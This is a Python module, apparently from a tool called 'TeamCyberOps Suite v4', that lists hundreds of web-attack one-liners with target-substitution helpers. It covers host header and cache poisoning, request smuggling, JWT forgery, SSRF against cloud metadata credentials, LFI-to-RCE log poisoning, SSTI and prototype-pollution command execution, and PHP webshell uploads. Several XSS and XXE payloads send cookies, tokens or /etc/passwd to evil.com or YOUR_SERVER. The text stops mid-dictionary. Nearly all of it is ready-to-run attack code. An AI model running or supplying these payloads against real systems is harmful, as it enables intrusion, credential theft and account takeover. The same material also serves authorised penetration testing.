"""
TeamCyberOps Suite v4 — Advanced Oneliners & Attack Chains
Host Header Injection | Cache Deception | Request Smuggling | CRLF | and 100+ more
"""

# ══════════════════════════════════════════════════════════════════════
#  HOST HEADER INJECTION
# ══════════════════════════════════════════════════════════════════════
HOST_HEADER_INJECTION = {
    "Basic Detection": [
        'curl -sk -H "Host: evil.com" https://{target}/ | grep -i "evil.com"',
        'curl -sk -H "Host: {target}.evil.com" https://{target}/ -v 2>&1 | grep -i location',
        'curl -sk -H "Host: localhost" https://{target}/ -v 2>&1 | grep -E "200|301|500"',
        'curl -sk -H "Host: 127.0.0.1" https://{target}/ -v 2>&1',
        'curl -sk -H "Host: 0.0.0.0" https://{target}/ -D -',
    ],
    "Password Reset Poisoning": [
        'curl -sk -X POST https://{target}/forgot-password -H "Host: attacker.com" -d "email=victim@{target}"',
        'curl -sk -X POST https://{target}/reset-password -H "X-Forwarded-Host: attacker.com" -d "email=test@{target}"',
        'curl -sk -X POST https://{target}/password-reset -H "X-Host: attacker.com" -d "username=admin"',
    ],
    "Cache Poisoning via Host": [
        'curl -sk -H "Host: evil.com" -H "X-Forwarded-Host: evil.com" https://{target}/',
        'curl -sk -H "Host: {target}" -H "X-Forwarded-Host: attacker.com" https://{target}/static/main.js',
        'for i in $(seq 1 20); do curl -sk -H "Host: attacker-$(date +%N).com" https://{target}/; done',
    ],
    "Internal Network Access": [
        'curl -sk -H "Host: internal.{target}" https://{target}/',
        'curl -sk -H "Host: admin.internal" https://{target}/admin',
        'curl -sk -H "Host: 192.168.1.1" https://{target}/',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  CACHE DECEPTION & POISONING
# ══════════════════════════════════════════════════════════════════════
CACHE_DECEPTION = {
    "Cache Deception": [
        'curl -sk "https://{target}/account/profile.css" -H "Cookie: session=VICTIM_SESSION"',
        'curl -sk "https://{target}/dashboard/..%2F..%2Fstatic/style.css" -H "Cookie: session=VICTIM"',
        'curl -sk "https://{target}/api/user/info.jpg"',
        'curl -sk "https://{target}/my-account/cached.css" -H "Cookie: auth=TOKEN" -v',
        'for ext in css js ico png jpg; do curl -sk "https://{target}/profile.$ext" -o /dev/null -w "%{target}→$ext: %{http_code} cache:%{header_x_cache}\n"; done',
    ],
    "Cache Poisoning": [
        'curl -sk -H "X-Forwarded-Host: evil.com" https://{target}/ | grep -i evil',
        'curl -sk -H "X-Original-URL: /admin" https://{target}/',
        'curl -sk -H "X-Rewrite-URL: /admin" https://{target}/',
        'curl -sk -H "X-Forwarded-Scheme: http" -H "X-Forwarded-Host: evil.com" https://{target}/',
        'curl -sk -H "Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable" https://{target}/ -D -',
    ],
    "Unkeyed Headers": [
        'curl -sk -H "X-Custom-Header-$(uuidgen): test" https://{target}/ -D - | grep -i cache',
        'curl -sk -H "Forwarded: for=evil.com" https://{target}/',
        'curl -sk -H "X-Forwarded-For: evil.com" https://{target}/ | grep -i evil',
        'for hdr in "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override" "Forwarded"; do echo "[$hdr]"; curl -sk -H "$hdr: evil.com" https://{target}/ | grep -i evil; done',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  HTTP REQUEST SMUGGLING
# ══════════════════════════════════════════════════════════════════════
HTTP_SMUGGLING = {
    "CL.TE Detection": [
        'printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" | nc {target} 80',
        'printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ" | timeout 10 nc -q3 {target} 443',
    ],
    "TE.CL Detection": [
        'printf "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5e\r\nGPOST / HTTP/1.1\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n" | nc {target} 80',
    ],
    "Using smuggler.py": [
        'python3 smuggler.py -u "https://{target}/" -l 3',
        'python3 smuggler.py -u "https://{target}/" --timeout 10 -m POST',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  CRLF INJECTION
# ══════════════════════════════════════════════════════════════════════
CRLF_INJECTION = {
    "Basic CRLF": [
        'curl -sk "https://{target}/%0d%0aSet-Cookie:crlftest=injected" -D - | grep -i crlftest',
        'curl -sk "https://{target}/%0aLocation:https://evil.com" -D - | grep -i location',
        'curl -sk "https://{target}/page?url=https://evil.com%0d%0aContent-Type:text/html" -v',
        'curl -sk "https://{target}/%E5%98%8D%E5%98%8ASet-Cookie:injected=1" -D -',
    ],
    "Header Injection": [
        'curl -sk "https://{target}/redirect?url=https://evil.com%0d%0aX-Injected:header" -v 2>&1 | grep -i x-injected',
        'curl -sk "https://{target}/path%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a" -v',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  CORS EXPLOITATION
# ══════════════════════════════════════════════════════════════════════
CORS_EXPLOITATION = {
    "CORS Misconfiguration": [
        'curl -sk -H "Origin: https://evil.com" https://{target}/api/user -v 2>&1 | grep -i "access-control"',
        'curl -sk -H "Origin: null" https://{target}/api/data -v 2>&1 | grep -i acao',
        'curl -sk -H "Origin: https://{target}.evil.com" https://{target}/api/profile -v 2>&1 | grep -i acao',
        'curl -sk -H "Origin: https://evil{target}" https://{target}/api/ -v 2>&1 | grep -i access',
        'for origin in "null" "https://evil.com" "https://{target}.evil.com" "file://"; do echo "[$origin]"; curl -sk -H "Origin: $origin" https://{target}/api/me -v 2>&1 | grep -i acao; done',
    ],
    "CORS + Credentials": [
        'curl -sk -H "Origin: https://evil.com" -H "Cookie: session=VICTIM" https://{target}/api/export -v 2>&1 | grep -i "allow-credentials"',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  JWT ATTACKS
# ══════════════════════════════════════════════════════════════════════
JWT_ATTACKS = {
    "JWT Detection & Decode": [
        'curl -sk https://{target}/api/me -H "Authorization: Bearer $(echo eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9. | base64)" -v',
        'python3 -c "import base64,json; t=\'PASTE_JWT_HERE\'; p=t.split(\'.\')[1]+\'==\'; print(json.dumps(json.loads(base64.b64decode(p)), indent=2))"',
    ],
    "Algorithm Confusion (none)": [
        'python3 -c "import base64,json; h=base64.b64encode(json.dumps({\'alg\':\'none\',\'typ\':\'JWT\'}).encode()).decode().rstrip(\'=\'); p=base64.b64encode(json.dumps({\'sub\':\'admin\',\'role\':\'admin\'}).encode()).decode().rstrip(\'=\'); print(f\'{h}.{p}.\')"',
    ],
    "RS256 to HS256 Confusion": [
        'python3 jwt_tool.py -t https://{target}/api/user -rh "Authorization: Bearer JWT_TOKEN" -X k -pk pubkey.pem',
        'python3 jwt_tool.py JWT_TOKEN -X a --exploit',
        'python3 jwt_tool.py JWT_TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""',
    ],
    "JWT Brute Force": [
        'hashcat -a 0 -m 16500 JWT_TOKEN /usr/share/wordlists/rockyou.txt',
        'python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  OAUTH & SSO ATTACKS
# ══════════════════════════════════════════════════════════════════════
OAUTH_ATTACKS = {
    "Open Redirect in Redirect_URI": [
        'curl -sk "https://{target}/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com&response_type=token" -v 2>&1 | grep location',
        'curl -sk "https://{target}/oauth/authorize?client_id=CLIENT&redirect_uri=https://{target}.evil.com/callback&response_type=code" -v',
        'curl -sk "https://{target}/oauth/authorize?client_id=CLIENT&redirect_uri=https://{target}/callback/../../../evil.com" -v 2>&1 | grep location',
    ],
    "Token Leakage via Referer": [
        'curl -sk "https://{target}/oauth/callback?code=AUTH_CODE" -H "Referer: https://evil.com/" -v',
    ],
    "State Parameter CSRF": [
        'curl -sk "https://{target}/oauth/authorize?client_id=CLIENT&redirect_uri=https://{target}/cb&response_type=code&state=" -v',
        'curl -sk "https://{target}/oauth/authorize?client_id=CLIENT&redirect_uri=https://{target}/cb&response_type=code" -v 2>&1 | grep -i state',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  PROTOTYPE POLLUTION
# ══════════════════════════════════════════════════════════════════════
PROTOTYPE_POLLUTION = {
    "Client-Side Detection": [
        'curl -sk "https://{target}/api?__proto__[polluted]=yes" -v | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(d.get(\'polluted\',\'not vuln\'))" 2>/dev/null',
        'curl -sk -H "Content-Type: application/json" -X POST https://{target}/api -d \'{"__proto__":{"polluted":"yes"}}\' | grep polluted',
        'curl -sk "https://{target}/api?constructor[prototype][polluted]=yes" | grep polluted',
    ],
    "Server-Side (Node.js)": [
        'curl -sk -H "Content-Type: application/json" -X POST https://{target}/api/merge -d \'{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'id > /tmp/pwned\');//"}}\' ',
        'curl -sk -H "Content-Type: application/json" -X POST https://{target}/api -d \'{"__proto__":{"NODE_OPTIONS":"--require /proc/self/fd/0","shell":"node","spawn":true}}\' ',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  GRAPHQL ATTACKS
# ══════════════════════════════════════════════════════════════════════
GRAPHQL_ATTACKS = {
    "Introspection": [
        'curl -sk -X POST https://{target}/graphql -H "Content-Type: application/json" -d \'{"query":"{ __schema { types { name fields { name } } } }"}\' | python3 -m json.tool',
        'curl -sk -X POST https://{target}/api/graphql -H "Content-Type: application/json" -d \'{"query":"{__typename}"}\' | grep -i typename',
        'python3 -c "import requests; r=requests.post(\'https://{target}/graphql\', json={\'query\':\'{\nquery IntrospectionQuery {\n  __schema {\n    queryType { name }\n    mutationType { name }\n    types { name kind }\n  }\n}\'} ); print(r.text[:2000])"',
    ],
    "Batch Attack": [
        'curl -sk -X POST https://{target}/graphql -H "Content-Type: application/json" -d \'[{"query":"{user(id:1){id,email}"},{"query":"{user(id:2){id,email}}"}]\' ',
    ],
    "Field Suggestion Attack": [
        'curl -sk -X POST https://{target}/graphql -H "Content-Type: application/json" -d \'{"query":"{users{passwor}}"}\' | grep -i "did you mean"',
    ],
    "IDOR via GraphQL": [
        'curl -sk -X POST https://{target}/graphql -H "Content-Type: application/json" -H "Cookie: session=VICTIM" -d \'{"query":"mutation{deleteUser(id:1){success}}"}\' ',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  SSRF ADVANCED CHAINS
# ══════════════════════════════════════════════════════════════════════
SSRF_CHAINS = {
    "Cloud Metadata": [
        'curl -sk "https://{target}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
        'curl -sk "https://{target}/proxy?target=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"',
        'curl -sk "https://{target}/redirect?url=http://100.100.100.200/latest/meta-data/"',
        'for path in "iam/security-credentials/" "user-data" "meta-data/hostname" "meta-data/local-ipv4"; do echo "[$path]:"; curl -sk "https://{target}/fetch?url=http://169.254.169.254/latest/$path"; echo; done',
    ],
    "Protocol Smuggling": [
        'curl -sk "https://{target}/fetch?url=dict://127.0.0.1:6379/info"',
        'curl -sk "https://{target}/proxy?url=file:///etc/passwd"',
        'curl -sk "https://{target}/load?url=gopher://127.0.0.1:6379/_FLUSHALL%0d%0a"',
        'curl -sk "https://{target}/api/webhook?callback=ftp://attacker.com/"',
    ],
    "SSRF Bypass": [
        'curl -sk "https://{target}/fetch?url=http://[::ffff:127.0.0.1]/"',
        'curl -sk "https://{target}/fetch?url=http://0x7f000001/"',
        'curl -sk "https://{target}/fetch?url=http://0177.0.0.1/"',
        'curl -sk "https://{target}/fetch?url=http://127.1/"',
        'curl -sk "https://{target}/fetch?url=http://localhost.attacker.com@127.0.0.1/"',
        'curl -sk "https://{target}/fetch?url=http://spoofed.attacker.com/" #DNS rebind to 127.0.0.1',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  LFI → RCE CHAINS
# ══════════════════════════════════════════════════════════════════════
LFI_RCE_CHAINS = {
    "Log Poisoning → RCE": [
        'curl -sk "https://{target}/page?file=/var/log/apache2/access.log" # check if readable',
        r'curl -sk -A "<?php system($cmd); ?>" https://{target}/ # inject into log',
        'curl -sk "https://{target}/?file=/var/log/apache2/access.log&cmd=id"',
        r'curl -sk -A "<?php system($c); ?>" https://{target}/ && curl -sk "https://{target}/?file=/var/log/nginx/access.log&c=id"',
    ],
    "PHP Session Poisoning": [
        r'curl -sk "https://{target}/?name=<?php+system($cmd);?>" -c /tmp/sess.txt',
        'curl -sk "https://{target}/?file=/tmp/sess_$(cat /tmp/sess.txt | grep PHPSESSID | awk \'{print $7}\')&cmd=id"',
    ],
    "PHP Wrappers": [
        'curl -sk "https://{target}/?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d',
        'curl -sk "https://{target}/?file=php://input" --data "<?php system(\'id\'); ?>"',
        'curl -sk "https://{target}/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==&c=id"',
        'curl -sk "https://{target}/?file=expect://id"',
    ],
    "Proc Environ Poisoning": [
        r'curl -sk -H "User-Agent: <?php system($cmd); ?>" "https://{target}/?file=/proc/self/environ&cmd=id"',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  BLIND XSS & STORED XSS CHAINS
# ══════════════════════════════════════════════════════════════════════
XSS_CHAINS = {
    "Blind XSS (OOB)": [
        'curl -sk -X POST https://{target}/contact -d "name=<script src=https://YOUR_XSS_HUNTER/payload.js></script>&email=x@x.com&msg=test"',
        'curl -sk -X POST https://{target}/feedback -H "Content-Type: application/json" -d \'{"message":"<img src=x onerror=fetch(`https://YOUR_SERVER/?c=`+document.cookie)>","user":"attacker"}\'',
    ],
    "XSS to Account Takeover": [
        '# Inject: <script>var x=new XMLHttpRequest();x.open("GET","https://{target}/api/token");x.withCredentials=true;x.onload=function(){fetch("https://evil.com/?d="+x.responseText)};x.send()</script>',
        '# CSRF via XSS: <script>fetch("https://{target}/api/change-email",{method:"POST",credentials:"include",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:"attacker@evil.com"})})</script>',
    ],
    "DOM Clobbering": [
        'curl -sk "https://{target}/page#<img name=x id=x><img name=toString>',
    ],
    "XSS via SVG Upload": [
        'echo \'<svg><script>alert(document.domain)</script></svg>\' > /tmp/xss.svg && curl -sk -F "file=@/tmp/xss.svg;type=image/svg+xml" https://{target}/upload',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  IDOR ATTACKS
# ══════════════════════════════════════════════════════════════════════
IDOR_ATTACKS = {
    "Horizontal IDOR": [
        'for i in $(seq 1 100); do curl -sk "https://{target}/api/user/$i" -H "Cookie: session=YOUR_SESSION" | grep -v forbidden; done',
        'for i in $(seq 1 50); do r=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}/api/orders/$i" -H "Cookie: session=YOUR_SESSION"); [ "$r" == "200" ] && echo "FOUND: /api/orders/$i"; done',
    ],
    "UUID / GUID Prediction": [
        'python3 -c "import uuid; print([str(uuid.UUID(int=i)) for i in range(1,20)])" | tr \',\' \'\n\'',
    ],
    "Parameter Manipulation": [
        'curl -sk "https://{target}/api/document?id=1&user_id=2" -H "Cookie: session=YOUR_SESSION"',
        'curl -sk "https://{target}/download?file=report_1.pdf" -H "Cookie: session=YOUR_SESSION"',
        'curl -sk "https://{target}/api/profile" -X PUT -H "Content-Type: application/json" -d \'{"user_id":1,"email":"attacker@evil.com"}\' -H "Cookie: session=YOUR_SESSION"',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  SQL INJECTION ADVANCED
# ══════════════════════════════════════════════════════════════════════
SQLI_ADVANCED = {
    "Time-Based Blind": [
        'curl -sk "https://{target}/api/search?q=1\' AND SLEEP(5)-- -" -w "Time: %{time_total}s\n"',
        'curl -sk "https://{target}/user?id=1 AND 1=IF(1=1,SLEEP(5),0)-- -" -w "%{time_total}s"',
        'curl -sk "https://{target}/api?id=1;WAITFOR DELAY \'0:0:5\'-- -" -w "%{time_total}s"',
    ],
    "Out-of-Band (OOB)": [
        "curl -sk \"https://{target}/search?q=1'+UNION+SELECT+LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\test'))-- -\"",
        "curl -sk \"https://{target}/id=1;exec master..xp_dirtree '//attacker.com/a'-- -\"",
    ],
    "Second Order SQLi": [
        'curl -sk -X POST https://{target}/register -d "username=admin\'-- -&password=test123"',
        '# Then: curl -sk https://{target}/profile -H "Cookie: session=REGISTERED_SESSION"',
    ],
    "SQLi WAF Bypass": [
        "curl -sk \"https://{target}/search?q=1'/**/UNION/**/SELECT/**/NULL,version()-- -\"",
        "curl -sk \"https://{target}/search?q=1'+uni%6fn+se%6cect+null,null-- -\"",
        "curl -sk \"https://{target}/api?id=1' /*!UNION*/ /*!SELECT*/ 1,2,3-- -\"",
        "curl -sk \"https://{target}/api?id=0x31272f2a2a2f554e494f4e2f2a2a2f53454c454354\" # hex encoded",
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  XXE ADVANCED
# ══════════════════════════════════════════════════════════════════════
XXE_ADVANCED = {
    "Classic XXE": [
        """curl -sk -X POST https://{target}/api/parse -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'""",
    ],
    "Blind XXE OOB": [
        """curl -sk -X POST https://{target}/api/upload -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://YOUR_SERVER/evil.dtd"> %xxe;]><root>test</root>'""",
        '# evil.dtd: <!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % oob "<!ENTITY exfil SYSTEM \'http://YOUR_SERVER/?d=%data;\'>">%oob;',
    ],
    "XXE via SVG": [
        """echo '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>' > /tmp/xxe.svg && curl -sk -F "file=@/tmp/xxe.svg" https://{target}/upload""",
    ],
    "XXE via Excel": [
        '# Inject into xl/sharedStrings.xml inside XLSX: <?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><sst>&xxe;</sst>',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  SUBDOMAIN TAKEOVER CHAINS
# ══════════════════════════════════════════════════════════════════════
TAKEOVER_CHAINS = {
    "GitHub Pages": [
        'dig CNAME sub.{target} | grep -i github',
        'curl -sk https://sub.{target}/ | grep -i "There isn\'t a GitHub Pages site here"',
        '# If vulnerable: create github.com/{username}/{sub.target} repo and enable Pages',
    ],
    "S3 Bucket": [
        'aws s3 ls s3://sub.{target} 2>&1 | grep -v NoSuchBucket',
        'curl -sk "https://sub.{target}.s3.amazonaws.com/" | grep -i NoSuchBucket',
        'dig CNAME sub.{target} | grep -i s3.amazonaws.com',
    ],
    "Heroku": [
        'curl -sk https://sub.{target}/ | grep -i "No such app"',
        '# heroku domains:add sub.{target} on attacker account',
    ],
    "Azure": [
        'curl -sk https://sub.{target}/ | grep -i "404 Web Site not found"',
        'dig CNAME sub.{target} | grep -i azurewebsites.net',
    ],
    "Bulk Check": [
        'cat subs.txt | while read s; do r=$(curl -sk "https://$s/" 2>/dev/null | head -c 500); echo "$s: $r"; done | grep -E "NoSuchBucket|There isn\'t a GitHub Pages|No such app|404 Web Site"',
        'subzy run --targets subs.txt --hide-fails --concurrency 10',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  SSTI EXPLOITATION
# ══════════════════════════════════════════════════════════════════════
SSTI_EXPLOIT = {
    "Detection": [
        'curl -sk "https://{target}/page?name={{7*7}}" | grep "49"',
        'curl -sk "https://{target}/render?template={{7*7}}" | grep "49"',
        'for p in "{{7*7}}" "#{7*7}"; do echo "$p: "; curl -sk "https://{target}/?q=$p" | grep -o "49"; done',
    ],
    "Jinja2 RCE": [
        "curl -sk \"https://{target}/?q={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"",
        "curl -sk \"https://{target}/render\" -d \"template={{''.__class__.__bases__[0].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}\"",
        "curl -sk \"https://{target}/page?name={{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}\"",
    ],
    "Twig RCE": [
        "curl -sk \"https://{target}/?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\"",
    ],
    "FreeMarker RCE": [
        r'curl -sk -X POST https://{target}/template -d "template=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  RECON ONELINERS (Full Chains)
# ══════════════════════════════════════════════════════════════════════
RECON_CHAINS = {
    "Full Subdomain Enum": [
        'subfinder -d {target} -silent | anew subs.txt && amass enum -passive -d {target} -o amass.txt && cat amass.txt | anew subs.txt && echo "[+] Total: $(wc -l < subs.txt)"',
        'cat subs.txt | httpx -silent -title -status-code -tech-detect -o live_subs.txt && echo "[+] Live: $(wc -l < live_subs.txt)"',
        'subfinder -d {target} -silent | dnsx -silent -a -resp | awk \'{print $1}\' | sort -u > resolved_ips.txt',
    ],
    "URL Harvest + Filter": [
        'echo {target} | gau --threads 10 | tee all_urls.txt | grep -E "\\?.*=" | tee params.txt | wc -l',
        'cat all_urls.txt | grep -E "\\.(php|asp|aspx|jsp|py|rb|do|action)\\?" | anew vulnerable_ext.txt',
        'echo {target} | waybackurls | sort -u | tee wayback.txt && cat wayback.txt | gf sqli | anew sqli_candidates.txt',
        'echo {target} | gau | gf xss | qsreplace \'"><img src=x onerror=alert(1)>\' | tee xss_payloads.txt',
        'cat all_urls.txt | gf ssrf | qsreplace "http://YOUR_INTERACTSH/" | xargs -I{} curl -sk {} &',
    ],
    "JS Analysis": [
        'echo {target} | gau | grep "\\.js$" | sort -u | xargs -I{} bash -c \'echo "---{}"; curl -sk {} | grep -E "(api_key|secret|token|password|auth)" | head -5\'',
        'katana -u https://{target} -js-crawl -d 5 -silent | grep "\\.js" | sort -u | while read u; do curl -sk $u | grep -E "api[_-]?key|secret|token|password" | grep -v "//"; done',
    ],
    "Port + Service": [
        'nmap -sV -T4 --open -p- {target} -oN nmap_full.txt 2>/dev/null | grep "open"',
        'echo {target} | naabu -silent -top-ports 1000 | httpx -silent -title -status-code -tech-detect',
        'masscan {target}/24 -p0-65535 --rate=1000 2>/dev/null | awk \'{print $4}\' | sort -u > masscan_ports.txt',
    ],
    "Vuln Scan": [
        'nuclei -u https://{target} -severity critical,high -silent -o nuclei_criticals.txt',
        'cat live_subs.txt | nuclei -tags cve,misconfig -severity high,critical -c 20 -silent',
        'cat params.txt | dalfox pipe --silence -b "YOUR_BLIND_XSS_URL"',
        'cat sqli_candidates.txt | while read url; do sqlmap -u "$url" --batch --smart --level 2 -q 2>/dev/null | grep -i "parameter.*is vulnerable"; done',
    ],
    "Tech-Based Attacks": [
        'cat live_subs.txt | httpx -silent -tech-detect | grep -i wordpress | awk "{print $1}" | while read u; do wpscan --url $u --enumerate vp,u 2>/dev/null; done',
        'cat live_subs.txt | httpx -silent -tech-detect | grep -i php | awk "{print $1}" | nuclei -tags php,vulnerability -severity medium,high,critical',
        'cat live_subs.txt | httpx -silent -tech-detect | grep -i nginx | awk "{print $1}" | nuclei -tags nginx,misconfig',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  PARAMETER-SPECIFIC ATTACKS
# ══════════════════════════════════════════════════════════════════════
PARAMETER_ATTACKS = {
    "Mass Param Injection": [
        'cat params.txt | qsreplace "FUZZ" | while read url; do ffuf -u "$url" -w payloads.txt -mr "FUZZ" -mc 200 -silent; done',
        'cat urls.txt | python3 -c "import sys; [print(l.strip()) for l in sys.stdin]" | xargs -I{} curl -sk {}',
    ],
    "Path Traversal": [
        'ffuf -u "https://{target}/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0',
        'for p in ../etc/passwd ../../etc/passwd ../../../etc/passwd ....//etc/passwd ..%2Fetc%2Fpasswd %2e%2e%2fetc%2fpasswd; do r=$(curl -sk "https://{target}/page?file=$p" | grep root); [ -n "$r" ] && echo "[VULN] $p: $r"; done',
    ],
    "File Upload Bypass": [
        'curl -sk -F "file=@shell.php;type=image/jpeg" https://{target}/upload -H "Cookie: session=SESSION"',
        'curl -sk -F "file=@shell.php5" https://{target}/upload',
        r'echo "<?php system($_GET[chr(99)]); ?>" > /tmp/shell.php && curl -sk -F "file=@/tmp/shell.php" https://{target}/upload',
        'for ext in php php3 php4 php5 phtml phar; do echo -n "$ext: "; curl -sk -F "file=@shell.$ext" https://{target}/upload | grep -i success; done',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  AUTOMATION CHAINS (Full Methodology)
# ══════════════════════════════════════════════════════════════════════
FULL_METHODOLOGY = {
    "Step 1 - Passive Recon": [
        'subfinder -d {target} -silent -o step1_subs.txt; amass enum -passive -d {target} -o step1_amass.txt; cat step1_amass.txt >> step1_subs.txt; sort -u step1_subs.txt -o step1_subs.txt; echo "[+] $(wc -l < step1_subs.txt) subdomains"',
    ],
    "Step 2 - DNS Resolution": [
        'dnsx -l step1_subs.txt -silent -a -resp -o step2_resolved.txt; echo "[+] $(wc -l < step2_resolved.txt) resolved"',
    ],
    "Step 3 - HTTP Probe + Tech": [
        'httpx -l step1_subs.txt -silent -title -status-code -tech-detect -o step3_live.txt; echo "[+] $(wc -l < step3_live.txt) live"',
    ],
    "Step 4 - URL Discovery": [
        'cat step1_subs.txt | gau --threads 20 -o step4_urls.txt; cat step1_subs.txt | while read s; do waybackurls $s; done | anew step4_urls.txt; echo "[+] $(wc -l < step4_urls.txt) URLs"',
    ],
    "Step 5 - Vuln Scan": [
        'nuclei -l step3_live.txt -tags cve,vulnerability,misconfig -severity high,critical -c 20 -silent -o step5_nuclei.txt',
        'cat step4_urls.txt | gf xss | dalfox pipe --silence -o step5_xss.txt',
        'cat step4_urls.txt | gf sqli | sqlmap -m - --batch --smart -q --output-dir=step5_sqli/',
    ],
    "Step 6 - Report": [
        'echo "# Bug Bounty Report - {target}" > final_report.md; echo "## Subdomains: $(wc -l < step1_subs.txt)" >> final_report.md; echo "## Live: $(wc -l < step3_live.txt)" >> final_report.md; echo "## URLs: $(wc -l < step4_urls.txt)" >> final_report.md; [ -f step5_nuclei.txt ] && echo "## Vulns: $(wc -l < step5_nuclei.txt)" >> final_report.md',
    ],
}

# ══════════════════════════════════════════════════════════════════════
#  ALL CATEGORIES INDEX
# ══════════════════════════════════════════════════════════════════════
ALL_ONELINER_CATEGORIES = {
    "🎯 Host Header Injection":    HOST_HEADER_INJECTION,
    "🗃 Cache Deception/Poisoning": CACHE_DECEPTION,
    "📦 HTTP Request Smuggling":   HTTP_SMUGGLING,
    "↩️ CRLF Injection":           CRLF_INJECTION,
    "🔓 CORS Exploitation":        CORS_EXPLOITATION,
    "🔑 JWT Attacks":              JWT_ATTACKS,
    "🔐 OAuth / SSO Attacks":      OAUTH_ATTACKS,
    "🧬 Prototype Pollution":      PROTOTYPE_POLLUTION,
    "📊 GraphQL Attacks":          GRAPHQL_ATTACKS,
    "📡 SSRF Advanced Chains":     SSRF_CHAINS,
    "🐚 LFI → RCE Chains":         LFI_RCE_CHAINS,
    "💉 XSS Advanced Chains":      XSS_CHAINS,
    "🆔 IDOR Attacks":             IDOR_ATTACKS,
    "💉 SQLi Advanced":            SQLI_ADVANCED,
    "📄 XXE Advanced":             XXE_ADVANCED,
    "🌀 Subdomain Takeover":       TAKEOVER_CHAINS,
    "🎭 SSTI Exploitation":        SSTI_EXPLOIT,
    "🔍 Recon Chains":             RECON_CHAINS,
    "📝 Parameter Attacks":        PARAMETER_ATTACKS,
    "⚡ Full Methodology":         FULL_METHODOLOGY,
}


def get_all_oneliners_flat(target: str = "{target}") -> list:
    """Return all oneliners as flat list with target substituted."""
    result = []
    for cats in ALL_ONELINER_CATEGORIES.values():
        for subcats in cats.values():
            for ol in subcats:
                result.append(ol.replace("{target}", target))
    return result


def get_category(cat_name: str, target: str = "{target}") -> dict:
    """Return a specific category's oneliners."""
    cat = ALL_ONELINER_CATEGORIES.get(cat_name, {})
    result = {}
    for subcat, items in cat.items():
        result[subcat] = [i.replace("{target}", target) for i in items]
    return result


def count_oneliners() -> int:
    total = 0
    for cats in ALL_ONELINER_CATEGORIES.values():
        for items in cats.values():
            total += len(items)
    return total


def get_tech_specific_oneliners(tech: str, target: str = "{target}") -> list:
    """Return recommended attack oneliners for detected technology."""
    tech_lower = tech.lower()
    mapping = {
        "wordpress": [
            f"wpscan --url https://{target} --enumerate vp,u,tt --random-user-agent",
            f"nuclei -u https://{target} -t technologies/wordpress/ -t vulnerabilities/wordpress/",
            f"curl -sk https://{target}/wp-json/wp/v2/users | python3 -m json.tool | grep -i name",
        ],
        "joomla": [
            f"nuclei -u https://{target} -t technologies/joomla/",
            f"curl -sk https://{target}/administrator/",
        ],
        "drupal": [
            f"nuclei -u https://{target} -t technologies/drupal/",
            f"droopescan scan drupal -u https://{target}",
        ],
        "nginx": [
            f"nuclei -u https://{target} -t misconfiguration/nginx/",
            f"curl -sk https://{target}/..%2Fetc/passwd",
        ],
        "apache": [
            f"nuclei -u https://{target} -t misconfiguration/apache/",
